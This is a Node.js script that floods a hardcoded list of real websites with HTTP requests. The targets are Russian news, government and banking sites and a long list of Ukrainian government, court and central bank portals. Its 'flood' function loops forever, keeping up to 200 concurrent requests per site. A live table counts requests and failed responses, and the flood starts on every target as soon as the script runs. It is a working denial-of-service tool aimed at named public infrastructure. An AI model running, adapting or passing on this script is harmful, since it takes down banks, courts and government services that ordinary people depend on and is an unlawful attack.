const fetch = require("node-fetch");
const table = require('text-table');

var targets = {
          'https://lenta.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://ria.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://ria.ru/lenta/': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://www.rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://www.rt.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
          'http://kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
          'http://en.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://smotrim.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://tass.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://tvzvezda.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://vsoloviev.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://www.1tv.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://www.vesti.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://online.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://mil.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://iz.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://ukraine.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://court.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },   
          'https://nazk.gov.ua': { number_of_requests: 0, number_of_errored_responses: 0 },
          'https://okhtyrkamr.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://snriu.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://obuhivrda.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://dsp.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://nlmk.com': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://thedigital.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://cip.gov.ua': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://hsc.gov.ua': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://ird.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://mkip.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'http://naas.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://loda.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://ombudsman.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://mfa.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://spravdi.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://bank.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://olexrada.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://hsc.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://znaimo.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://kr.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://mkrada.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },    
          'https://diia.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://cvk.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://naqa.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://imr.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'http://nbuviap.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://testportal.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://kga.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://nrcrm.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://zpr.hsc.gov.ua': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://www.rnbo.gov.ua': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://www.president.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://tripadvisor.mfa.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://vue.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://bs.dp.court.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'http://www.kovelrada.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://www.hniise.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://bank.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },    
          'https://an.dp.court.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },   
          'https://mfa.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://ml.od.court.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://cnap.mlt.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },     
          'https://www.nssmc.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 }
}

setInterval(() => {
    console.clear();
    
    const site_data = [];
    
    Object.entries(targets).forEach(([key, value]) => {
        site_data.push(
            [
                JSON.stringify(key), "|",
                value["number_of_requests"], "|",
                value["number_of_errored_responses"], "|",
                JSON.stringify(String(value["error_message"]))
            ]
        )
    });

    let t = table([
        ["SITE", "|", "REQUESTS MADE", "|", "REQUESTS FAILED", "|", "ERROR MESSAGE"],
        ...site_data
    ], { align: ['l', 'c', 'c', 'c', 'c', 'c', 'l'] }
    );

    console.log(t);
});

var CONCURRENCY_LIMIT = 200
var queue = []

async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
        signal: controller.signal
    }).then((response) => {
        clearTimeout(id);
        return response;
    }).catch((error) => {
        clearTimeout(id);
        throw error;
    });
}

async function flood(target) {
    for (var i = 0; ; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift()
        }
        queue.push(
            fetchWithTimeout(target, { timeout: 1000 })
                .catch((error) => {
                    if (error.code === 20 /* ABORT */) {
                        return;
                    }
                    targets[target].number_of_errored_responses++;
                    targets[target].error_message = error.message
                })
                .then((response) => {
                    if (response && !response.ok) {
                        targets[target].number_of_errored_responses++;
                        targets[target].error_message = response.statusText
                    }
                    targets[target].number_of_requests++;
                })


        )
    }
}

//Start
Object.keys(targets).map(flood)

